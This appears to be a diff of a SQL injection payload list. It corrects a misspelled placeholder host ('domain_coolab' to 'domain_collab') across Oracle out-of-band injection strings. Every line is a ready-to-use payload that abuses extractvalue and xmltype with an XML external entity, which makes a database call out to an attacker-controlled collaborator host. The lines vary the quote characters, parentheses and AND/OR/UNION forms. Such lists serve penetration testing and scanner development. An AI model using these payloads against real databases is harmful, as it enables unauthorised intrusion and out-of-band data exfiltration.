-") AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-') AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-`) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
+") AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+') AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
 ") OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
 ') OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
 `) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-")) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-')) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-`)) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-"UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-'UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-`UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
+")) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+')) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`)) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+"UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+'UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`UNION SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
 ") AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
 ') AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
 `) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
-")) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-')) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
-`)) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_coolab/"> %remote;]>'),'/l') FROM dual--
+")) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+')) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
+`)) AND SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual--
 ")) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
 ')) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
 `)) OR SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://domain_collab/"> %remote;]>'),'/l') FROM dual-- 
